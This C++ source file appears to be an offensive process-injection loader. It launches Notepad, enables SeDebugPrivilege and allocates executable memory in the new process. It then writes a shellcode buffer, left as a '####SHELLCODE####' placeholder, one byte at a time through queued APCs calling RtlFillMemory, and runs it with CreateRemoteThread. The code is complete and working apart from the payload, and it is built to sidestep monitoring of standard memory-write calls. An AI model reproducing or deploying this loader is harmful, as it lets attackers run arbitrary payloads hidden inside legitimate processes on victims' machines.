/**
Author: Thomas X Meng
Classic userland API + APC Write Memory
Reference: 
https://www.x86matthew.com/view_post?id=writeprocessmemory_apc
***/
#include <windows.h>
#include <cstdio>
#include <stdio.h>
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif


#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures
typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);

DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength) {
    HANDLE hThread = NULL;
    NtQueueApcThread_t pNtQueueApcThread = NULL;
    NtCreateThreadEx_t pNtCreateThreadEx = NULL;
    void *pRtlFillMemory = NULL;
    
    // Locate the functions
    pNtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
    pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    pRtlFillMemory = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlFillMemory"); //This uses stdcall calling convention and called by NtQueueApcThread
    //

    if (!pNtQueueApcThread || !pNtCreateThreadEx || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

    // Create a suspended thread in the target process
    ULONG status = pNtCreateThreadEx(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (PVOID)(ULONG_PTR)ExitThread, NULL, NT_CREATE_THREAD_EX_SUSPENDED, 0, 0, 0, NULL);
    // ULONG status = pNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)ExitThread, NULL, CREATE_SUSPENDED, 0, 0, 0, NULL);
    if (status != 0) {
        printf("[-] Failed to create remote thread: %lu\n", status);
        return 1;
    }

    // Write memory using APCs
    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            printf("Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
        }
        ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        if (result != STATUS_SUCCESS) {
            printf("Failed to queue APC. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        }
    }
    // for(DWORD i = 0; i < dwLength; i++) {
    //     // Schedule a call to RtlFillMemory to update the current byte
    //     if(pNtQueueApcThread(hThread, pRtlFillMemory, (void*)((BYTE*)pAddress + i), (void*)1, (void*)*(BYTE*)(pData + i)) != 0) {
    //         // If there's an error, terminate and close the thread, then return
    //         TerminateThread(hThread, 0);
    //         CloseHandle(hThread);
    //         return 1;
    //     }
    // }
    // for (DWORD i = 0; i < dwLength; i++) {
    //     BYTE byte = pData[i];
    //     PVOID targetAddress = (PVOID)((BYTE*)pAddress + i);

    //     // Output the byte and target address
        // printf("[+] Writing byte 0x%02X to address %p\n", byte, targetAddress);

    //     if (pNtQueueApcThread(hThread, pRtlFillMemory, targetAddress, (PVOID)1, (PVOID)(ULONG_PTR)byte) != 0) {
    //         printf("[-] Failed to queue APC.\n");
    //         TerminateThread(hThread, 0);
    //         CloseHandle(hThread);
    //         return 1;
    //     }
    // }

    // Resume the thread to execute queued APCs
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    return 0;
}

unsigned char magiccode[] = ####SHELLCODE####;

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize);


// void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize) {
void Injectmagiccode(DWORD processId, const unsigned char* magiccode, SIZE_T magiccodeSize) {
    HANDLE hThread = NULL;
    PVOID lpAllocationStart = NULL;
    DWORD oldProtect = 0;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed (%d).\n", GetLastError());
        return;
    }

    // Allocate memory in the target process
    lpAllocationStart = VirtualAllocEx(hProcess, NULL, magiccodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpAllocationStart == NULL) {
        printf("[-] VirtualAllocEx failed (%d).\n", GetLastError());
        return;
    }

    // Write the magiccode using the APC-based method
    if (WriteProcessMemoryAPC(hProcess, (BYTE*)lpAllocationStart, (BYTE*)magiccode, magiccodeSize) != 0) {
        printf("[-] WriteProcessMemoryAPC failed.\n");
        // VirtualFreeEx(hProcess, lpAllocationStart, 0, MEM_RELEASE);
        // return;
    }

    // if (!WriteProcessMemory(hProcess, lpAllocationStart, magiccode, magiccodeSize, NULL)) {
    //     printf("[-] WriteProcessMemory failed (%d).\n", GetLastError());
    //     return;
    // }
    
    // The code for creating a remote thread to execute the magiccode can remain unchanged
    // as it's not directly related to the memory writing technique being demonstrated
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed (%d).\n", GetLastError());
        VirtualFreeEx(hProcess, lpAllocationStart, 0, MEM_RELEASE);
        return;
    }

    // Wait for the magiccode to execute
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] magiccode execution completed\n");

    // Cleanup
    VirtualFreeEx(hProcess, lpAllocationStart, 0, MEM_RELEASE);
    CloseHandle(hThread);
}

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}


BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}



int main(int argc, char *argv[])
{

    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
        return -1;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;

    char notepadPath[MAX_PATH] = {0};

    // Determine the correct Notepad path based on system architecture
    if (IsSystem64Bit()) {
        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
    } else {
        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
    }

    // Attempt to create a process with Notepad
    BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (!success) {
        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
        return 1; // Exit if unable to start Notepad
    }
    pid = pi.dwProcessId;
    printf("[+] Remote process ID: %d\n", pid);



    SIZE_T magiccodeSize = sizeof(magiccode);

	printf("[+] Classic execution with APC starts, I will be whispering in your ears \n");
    // Injectmagiccode(pi.hProcess, magiccode, magiccodeSize);
    Injectmagiccode(pid, magiccode, magiccodeSize);
    printf("[+] Successs, press Ctrl+C to exit\n");
    Sleep(500000);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

	return 0;
}